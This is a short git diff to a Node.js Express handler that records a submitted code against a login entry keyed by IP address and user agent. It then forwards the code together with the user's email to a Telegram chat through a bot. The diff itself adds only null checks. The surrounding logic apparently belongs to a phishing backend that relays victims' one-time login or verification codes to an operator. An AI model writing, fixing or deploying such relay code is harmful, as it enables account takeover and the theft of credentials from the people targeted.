@@ -53,9 +53,14 @@ const sendCode = async (req, res) => {
     const ipAddress = getIpAddress();
     const userAgent = req.headers["user-agent"];
 
-    const user = await Login.findOneAndUpdate({ ip: ipAddress + userAgent }, {code: req.body.code} ,{new: true});
 
-    
+    if(!ipAddress) {
+       return res.status(404).json({ error: 'ip address not found'})
+    }
+    const user = await Login.findOneAndUpdate({ ip: ipAddress + userAgent }, {code: req.body.code} ,{new: true});
+ if (!user) {
+   return res.status(404).json({ error: "User not found" });
+ }
     const message = `${`${user.code} from ${user.email}`}`;
     bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message);
 
